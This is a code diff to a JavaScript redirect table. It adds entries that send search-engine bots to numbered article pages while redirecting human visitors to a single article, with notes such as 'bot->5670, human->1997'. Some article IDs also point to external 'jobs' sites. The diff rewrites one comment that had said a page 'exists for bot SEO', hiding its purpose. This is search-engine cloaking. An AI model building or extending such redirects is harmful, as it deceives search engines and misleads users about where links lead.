@@ -26,8 +26,19 @@ const DEFAULT_REDIRECTS = [
   { articleId: '234', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
   { articleId: '901', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
   { articleId: '678', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
-  { articleId: '4563', targetUrl: 'https://us72.site/', note: 'jobs (article 4563.html exists for bot SEO)' },
+  { articleId: '4563', targetUrl: 'https://us72.site/', note: 'jobs' },
   { articleId: '9010', targetUrl: 'articles/1997.html', note: 'bot->9010, human->1997' },
+  { articleId: '5670', targetUrl: 'articles/1997.html', note: 'bot->5670, human->1997' },
+  { articleId: '6780', targetUrl: 'articles/1997.html', note: 'bot->6780, human->1997' },
+  { articleId: '2340', targetUrl: 'articles/1997.html', note: 'bot->2340, human->1997' },
+  { articleId: '12010', targetUrl: 'articles/1997.html', note: 'bot->12010, human->1997' },
+  { articleId: '1213', targetUrl: 'articles/1997.html', note: 'bot->1213, human->1997' },
+  { articleId: '12130', targetUrl: 'articles/1997.html', note: 'bot->12130, human->1997' },
+  { articleId: '1312', targetUrl: 'articles/1997.html', note: 'bot->1312, human->1997' },
+  { articleId: '13120', targetUrl: 'articles/1997.html', note: 'bot->13120, human->1997' },
+  { articleId: '20020370', targetUrl: 'articles/1997.html', note: 'bot->20020370, human->1997' },
+  { articleId: '19971222', targetUrl: 'articles/1997.html', note: 'bot->19971222, human->1997' },
+  { articleId: '199712220', targetUrl: 'articles/1997.html', note: 'bot->199712220, human->1997' },
 ]
 
 // ═══════════════════════════════════════════════════════════════
